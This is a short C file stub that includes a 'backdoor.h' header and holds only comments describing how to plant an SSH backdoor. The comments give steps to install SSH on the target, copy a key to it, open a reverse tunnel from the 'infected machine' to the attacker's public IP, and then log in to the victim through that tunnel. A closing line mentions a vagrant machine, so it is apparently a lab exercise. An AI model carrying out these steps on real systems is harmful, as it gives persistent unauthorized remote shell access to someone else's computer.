#include "backdoor.h"

//do both of following commands on your own pc as well as pc your attacking
//sudo apt-get install openssh-client
//sudo apt-get install openssh-server

//generate key `ssh-keygen`, press enter all times asked for input
//`ssh-copy-id -i ~/.ssh/id_rsa user@host`

//on infected machine run `ssh -fN -R 7000:localhost:22 username@attackerPublicIp` to set up reverse connection
//on attacker machine run `ssh infectedUsername@localhost -p 7000`

//generate ssh key pair, add public one to vagrant machine

